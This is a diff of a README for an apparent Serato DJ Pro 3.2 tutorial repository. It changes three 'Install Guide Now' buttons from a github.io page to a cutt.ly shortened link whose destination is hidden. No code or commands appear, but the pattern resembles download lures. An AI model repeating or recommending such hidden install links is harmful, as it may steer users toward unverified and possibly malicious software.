@@ -7,7 +7,7 @@
 
 🎵 Elevate your DJ performances with Serato DJ Pro 3.2 in 2025! This repository offers tutorials, resources, and tips for DJs to explore Serato’s tools for mixing, scratching, and live sets. Join our community of music creators to take your DJ skills to the next level!  
 
-<a href="https://djmixhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/jrNt4xm4" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -22,10 +22,9 @@
 - ✅ **Community Hub**: Connect with DJs and music creators.  
 - ✅ **Performance Tips**: Optimize your DJ workflow.  
 
-<a href="https://djmixhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/jrNt4xm4" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
-
 
 ### 💻 System Requirements  
 
@@ -35,7 +34,7 @@
 - **Processor**: Multi-core Intel/AMD (2.0GHz+)  
 - **Controller**: Compatible DJ hardware (e.g., Pioneer, Numark)  
 
-<a href="https://djmixhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/jrNt4xm4" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
